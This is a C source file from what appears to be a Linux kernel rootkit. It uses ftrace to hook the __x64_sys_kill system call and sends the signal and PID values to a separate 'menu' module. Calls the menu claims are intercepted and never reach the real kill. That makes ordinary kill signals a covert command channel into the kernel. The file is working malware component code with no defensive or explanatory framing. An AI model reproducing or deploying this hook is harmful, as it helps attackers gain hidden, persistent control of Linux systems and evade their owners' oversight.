#include "../include/core.h"
#include "../include_hooks/kill.h"
#include "../include_modules/menu.h"

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    long sig = regs->si;
    long pid = regs->di;

    int call_menu = menu(sig, pid);
    if (call_menu != 0) {
        return call_menu;

    }

    return orig_kill(regs);

}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),

};


int init_hook_kill(void) {
    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;

    }

    return 0;

};

void exit_hook_kill(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

};